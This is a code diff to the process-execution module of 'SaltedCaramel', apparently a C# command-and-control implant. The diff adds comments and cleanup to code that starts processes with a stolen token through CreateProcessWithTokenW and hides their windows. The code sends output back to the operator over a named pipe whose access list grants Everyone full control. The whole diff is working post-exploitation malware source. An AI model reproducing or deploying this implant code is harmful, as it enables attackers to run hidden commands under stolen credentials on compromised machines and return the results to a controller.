@@ -6,12 +6,13 @@ using System.IO.Pipes;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.AccessControl;
-using System.Threading;
 
 namespace SaltedCaramel
 {
     internal class Proc
     {
+        // If we have a stolen token, we need to start a process with CreateProcessWithTokenW
+        // Otherwise, we can use Process.Start
         internal static void Execute(SCTask task, SCImplant implant)
         {
             if (implant.hasAlternateToken() == true)
@@ -25,20 +26,28 @@ namespace SaltedCaramel
             string[] split = task.@params.Trim().Split(' ');
             string argString = string.Join(" ", split.Skip(1).ToArray());
             string file = split[0];
+            // Create PROCESS_INFORMATION struct to hold info about the process we're going to start
             Win32.PROCESS_INFORMATION newProc = new Win32.PROCESS_INFORMATION();
+            // STARTUPINFO is used to control a few startup options for our new process
             Win32.STARTUPINFO startupInfo = new Win32.STARTUPINFO();
+            // Use C:\Temp as directory to ensure that we have rights to start our new process
+            // TODO: determine if this is safe to change
             string directory = "C:\\Temp";
 
+            // Use random name for our named pipe (used to retrieve output from process)
             byte[] random = new byte[2];
             Random rnd = new Random();
             rnd.NextBytes(random);
             string pipeName = "Caramel_" + BitConverter.ToString(random);
 
+            // Set ACL on named pipe to allow any user to access
             PipeSecurity sec = new PipeSecurity();
             sec.SetAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));
 
-            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.None, 1024, 1024, sec);
-
+            // Create named pipe server and client
+            // We need to use nanmed pipes to communicate with processes started using the Win32 API
+            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances,
+                PipeTransmissionMode.Message, PipeOptions.None, 1024, 1024, sec);
             NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut, PipeOptions.None);
 
             try
@@ -51,6 +60,8 @@ namespace SaltedCaramel
                     // Set process to use named pipe for input/output
                     startupInfo.hStdInput = pipeClient.SafePipeHandle.DangerousGetHandle();
                     startupInfo.hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle();
+                    // STARTF_USESTDHANDLES ensures that the process will respect hStdInput/hStdOutput
+                    // STARTF_USESHOWWINDOW ensures that the process will respect wShowWindow
                     startupInfo.dwFlags = (uint)Win32.STARTF.STARTF_USESTDHANDLES | (uint)Win32.STARTF.STARTF_USESHOWWINDOW;
                     startupInfo.wShowWindow = 0;
                 }
@@ -60,18 +71,20 @@ namespace SaltedCaramel
                     throw new Exception("Error connecting to named pipe server.");
                 }
 
+                // We're using lpCommandLine to start our new process because I had issues using both lpApplicationName and lpCommandLine
                 string cmdLine;
                 if (argString != "")
                     cmdLine = "\"" + file + "\" \"" + argString + "\"";
                 else
                     cmdLine = "\"" + file + "\"";
+                // Finally, create our new process
                 bool createProcess = Win32.CreateProcessWithTokenW(TokenHandle, IntPtr.Zero, null, cmdLine, IntPtr.Zero, IntPtr.Zero, directory, ref startupInfo, out newProc);
-                if (createProcess)
+                if (createProcess) // Process started successfully
                 {
                     Debug.WriteLine("[-] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);
                     SCTaskResp procStatus = new SCTaskResp(task.id, "Created process with PID " + newProc.dwProcessId);
                     implant.PostResponse(procStatus);
-                    Process proc = Process.GetProcessById(newProc.dwProcessId);
+                    Process proc = Process.GetProcessById(newProc.dwProcessId); // We can use Process.HasExited() with this object
 
                     // Trying to continuously read output while the process is running.
                     using (StreamReader reader = new StreamReader(pipeServer))
@@ -86,8 +99,11 @@ namespace SaltedCaramel
                                 implant.PostResponse(response);
                             }
                         }
+
                         pipeClient.Close();
-                        message = reader.ReadToEnd();
+                        pipeClient.Dispose();
+
+                        message = reader.ReadToEnd(); // Ensure we get any output that we missed when loop ended
                         if (message != "")
                         {
                             SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(message));
@@ -96,6 +112,7 @@ namespace SaltedCaramel
                     }
 
                     pipeServer.Close();
+                    pipeServer.Dispose();
                     implant.SendComplete(task.id);
                 }
                 else // TODO: Throw exception on error
@@ -117,7 +134,6 @@ namespace SaltedCaramel
 
         internal static void StartProcess (SCTask task, SCImplant implant)
         {
-            // TODO: Figure out how to hook StandardError and StandardOutput at the same time
             string[] split = task.@params.Trim().Split(' ');
             string argString = string.Join(" ", split.Skip(1).ToArray());
             ProcessStartInfo startInfo = new ProcessStartInfo();
